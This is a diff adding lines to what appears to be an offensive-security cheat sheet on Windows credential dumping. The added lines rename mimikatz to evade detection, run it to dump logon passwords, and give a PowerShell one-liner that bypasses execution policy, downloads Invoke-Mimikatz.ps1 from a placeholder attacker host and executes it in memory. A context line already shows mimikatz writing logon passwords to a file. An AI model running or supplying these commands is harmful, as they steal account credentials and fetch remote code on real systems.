@@ -375,6 +375,23 @@ Or just a oneliner
 
 `.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > pass.txt`
 
+Or change the name to `p.exe` and
+
+```cmd
+c:\ProgramData\p.exe  ""privilege::debug"" ""sekurlsa::logonpasswords""
+```
+
+Or powershell version
+
+```powershell
+
+powershell  -ep Bypass -NoP -NonI -NoLogo -c IEX (New-Object Net.WebClient).DownloadString('https://ip.attqacker/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'
+```
+
+more options to hide mimikatz
+
+`https://www.crowdstrike.com/blog/credential-theft-mimikatz-techniques/`
+
 ### Password misues
 
 * if clear text password is obtained start new powershell session
